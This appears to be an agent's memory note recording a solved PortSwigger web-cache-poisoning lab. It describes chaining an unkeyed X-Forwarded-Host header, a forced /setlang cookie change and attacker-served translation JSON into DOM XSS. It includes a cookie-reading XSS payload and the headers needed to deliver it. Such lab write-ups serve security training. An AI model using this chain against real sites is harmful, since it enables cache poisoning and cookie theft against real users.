---
metadata:
  node_type: memory
name: "lab-web-cache-poisoning-combining-vulnerabilities-arm-a"
description: "Expert cache-poisoning lab: unkeyed X-Forwarded-Host -> data.host -> self-fetch /setlang to set the lang cookie -> attacker translations.json DOM XSS via innerHTML; solved."
last_updated: 2026-10-10T16:55:38+08:00
created: 2026-10-10T16:55:38+08:00
---

Lab: /web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities
Instance: 0a75009e04658795803f5d2700f000e1.web-security-academy.net (reused:false)
Result: SOLVED (banner "Congratulations, you solved the lab!", solved:true)

Chain (three moves, all needed):
1. Unkeyed header: home page embeds `data = {"host":"<X-Forwarded-Host>","path":"/"}` in an inline
   script. X-Forwarded-Host is NOT in the cache key (poison on a cache miss, then any clean GET /
   returns the poisoned copy). Value is JSON-escaped AND `</` -> `<\/` hardened, so no direct script
   breakout (tested: quote, backslash, `</`, `<//`, `&#47;`, percent-encoded forms all neutralised).
2. data.host feeds `initTranslations('//' + data.host + '/resources/json/translations.json')`.
   translations.js gate: `lang in j && lang.toLowerCase() !== 'en' && j[lang].translations && translate(...)`
   and `translate()` does `el.innerHTML = dict[k]` -> DOM XSS. The victim's lang cookie is `en`, so the
   gate blocks every payload. Slash and query survive in data.host, so set it to
   `<same-host>/setlang/en-gb?x=` : the victim's OWN page then fetches /setlang/en-gb same-origin and
   the site answers `302 + Set-Cookie: lang=en-gb; Path=/; Secure` -> the victim language changes.
3. Second poisoning pass with `X-Forwarded-Host: <exploit-server>` serves the attacker JSON
   (`Access-Control-Allow-Origin: *`, key `en-gb`,
   `"View details": "<img src=x onerror=alert(document.cookie)>"`) -> innerHTML sink fires the alert.

Evidence: exploit-server access log showed UA "...(Victim)... Chrome/154" fetching
/resources/json/translations.json about 6x; local page_alert with lang=en-gb fired (alert:lang=en-gb)
before the live run; banner flipped after phase 1 (~110s) + phase 2 (~215s).

Facts worth keeping:
- Home page: X-Cache hit/miss, Cache-Control max-age=30, no Vary; the query string IS part of the key.
- /setlang/<code>: 302 -> /?localized=1, Cache-Control private, sets lang=<code>; Path=/; Secure (not HttpOnly).
- translations.json language codes: en, es, cn, ar, en-gb ("Proper English"), ml, hb, zl, fn, hw, mm.
- attacker-served JSON must be valid JSON with ACAO:* or r.json() rejects the cross-origin read.

